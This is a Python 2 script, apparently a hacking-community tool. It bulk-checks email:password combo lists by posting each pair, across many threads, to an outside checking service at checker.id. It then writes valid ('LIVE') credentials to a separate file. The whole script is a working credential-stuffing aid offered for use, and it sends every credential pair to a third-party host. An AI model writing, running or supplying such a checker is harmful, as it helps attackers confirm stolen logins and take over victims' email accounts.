#Author by Aditya R
#Special Thank's to Rahim AR
#http://fb.me/my.profile.co.id
import requests, threading, sys, datetime, os
from Queue import Queue
sys.stderr.write("\x1b[2J\x1b[H")

live = open("empass_live.txt","a")
die = open("empass_die.txt","a")
badlist = open("empass_bad.txt","a")

totallive = 0
totaldie = 0
totalbad = 0
unknow = 0

def cek(empass, delim):
	global totallive
	global totaldie
	global totalbad
	global unknow
	data = {"ajax":"0","do":"check","mailpass":empass,"delim":delim}
	api = "https://checker.id/mailcheck/api.php"
	try:
		resp = requests.post(api, data=data, timeout=30).text
		if "LIVE" in resp:
			print("\033[32;1m[ LIVE ]" +empass+" [ Acc : Email ]\033[0m")
			totallive = totallive + 1
			live.write(empass+"\n")
		elif "DIE" in resp:
			print("\033[31;1m[ DIE ]" +empass+"\033[0m")
			totaldie = totaldie + 1
			die.write(empass+"\n")
		elif "Badlist" in resp:
			print("\033[34;1m[ BAD LIST ]" +empass+"\033[0m")
			badlist.write(empass+"\n")
			totalbad = totalbad + 1
		else:
			print("\033[31;1m[ UNKNOW ]" +empass+"\033[0m")
			unknow = unknow + 1
	except KeyboardInterrupt:
		p = raw_input("Want To Exit ? [Y/n] ")
		if p == "N" or p == "n":
			pass
		else:
			exit("Bye")
	except Exception as err:
		print(str(err))
		
try:
	print("-"*40)
	print("Author by Aditya Ramdhani")
	print("Contact : https://www.facebook.com/AdityaRamdaniCommunity")
	print("-"*40)
	list = raw_input("\033[34;1m[+]\033[0m Input list : ")
	delim = raw_input("\033[34;1m[+]\033[0m Type Delim : ")
	thread = raw_input("\033[34;1m[+]\033[0m Total Thread : ")
except:
	exit()
asu = open(list).read().splitlines()
jobs = Queue()
def do_stuff(q):
	global sampe
	while not q.empty():
		value = q.get()
		cek(value, delim)
		q.task_done()

kk = 0
for trgt in asu:
	kk = kk + 1
	jobs.put(trgt)
print("\033[34;1m\n[!]\033[0m Total Empass : "+str(kk))
print("-"*40)
for i in range(int(thread)):
	worker = threading.Thread(target=do_stuff, args=(jobs,))
	worker.start()
jobs.join()
print("-"*40)
print("\033[32;1m[!] Total Live : "+str(totallive))
print("\033[31;1m[!] Total Die : "+str(totaldie))
print("\033[34;1m[!] Total Bad List : "+str(totalbad))
print("\033[33;1m[!] Total Unknow : "+str(unknow))
print("\033[0m")